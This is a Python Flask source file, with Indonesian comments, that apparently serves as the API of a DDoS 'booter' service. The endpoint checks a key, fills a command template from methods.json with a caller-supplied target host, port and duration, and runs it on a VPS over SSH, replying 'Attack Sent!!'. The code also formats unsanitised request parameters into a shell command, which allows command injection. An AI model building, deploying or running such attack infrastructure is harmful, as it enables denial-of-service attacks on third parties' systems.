from flask import Flask, request
import json
import subprocess
import paramiko

app = Flask(__name__)

def ssh_login(server_info):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname=server_info['hostname'],
                    port=server_info['port'],
                    username=server_info['username'],
                    password=server_info['password'])
        return ssh
    except Exception as e:
        print(f"Failed to connect to {server_info['hostname']}: {e}")
        return None

def run_ssh_command(ssh, command):
    stdin, stdout, stderr = ssh.exec_command(command)
    return stdout.read().decode(), stderr.read().decode()

@app.route('/')
def run_command():
    # Mengambil parameter dari URL
    key = request.args.get('key')
    host = request.args.get('host')
    port = request.args.get('port')
    time = request.args.get('time')
    method = request.args.get('method')

    # Membaca command dari file methods.json
    with open('methods.json') as f:
        methods = json.load(f)

    # Mengecek apakah method tersedia
    if method not in methods:
        return 'Method tidak tersedia', 400

    # Mengecek apakah key.json tersedia
    with open('key.json') as f:
        keys = json.load(f)

    # Mengecek apakah key valid
    if key not in keys:
        return 'Key tidak valid', 401

    # Mengambil command sesuai method
    command = methods[method].format(host=host, port=port, time=time)

    # Membaca informasi server dari file servers.json
    with open('servers.json') as f:
        servers_info = json.load(f)

    # Melakukan login ke server VPS
    ssh = ssh_login(servers_info['servers'][0])  # Mengambil info server pertama saja

    if ssh is None:
        return 'Gagal melakukan login ke server', 500

    # Menjalankan command via SSH
    output, error = run_ssh_command(ssh, command)
    app.logger.info('Attack Sent!!!')

    # Menutup koneksi SSH
    ssh.close()

    if error:
        return error, 500

    return 'Attack Sent!!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6655)
